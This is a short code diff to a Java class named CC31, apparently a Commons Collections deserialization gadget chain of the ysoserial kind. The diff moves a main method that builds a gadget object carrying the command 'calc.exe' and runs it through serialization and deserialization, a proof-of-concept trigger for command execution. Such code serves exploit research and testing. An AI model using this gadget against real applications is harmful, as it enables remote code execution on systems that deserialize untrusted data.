@@ -14,6 +14,12 @@ import java.util.Map;
 
 @SuppressWarnings("all")
 public class CC31 {
+    public static void main(final String[] args) throws Exception {
+        CC31 c = new CC31();
+        Object o = c.getObject("calc.exe");
+        SerUtil.deserializeObject(SerUtil.serializeObject(o));
+    }
+
     public Object getObject(final String command) throws Exception {
 
         final String[] execArgs = new String[]{command};
@@ -77,11 +83,5 @@ public class CC31 {
 
         return map;
 
-    }
-
-    public static void main(final String[] args) throws Exception {
-        CC31 c = new CC31();
-        Object o = c.getObject("calc.exe");
-        SerUtil.deserializeObject(SerUtil.serializeObject(o));
     }
 }
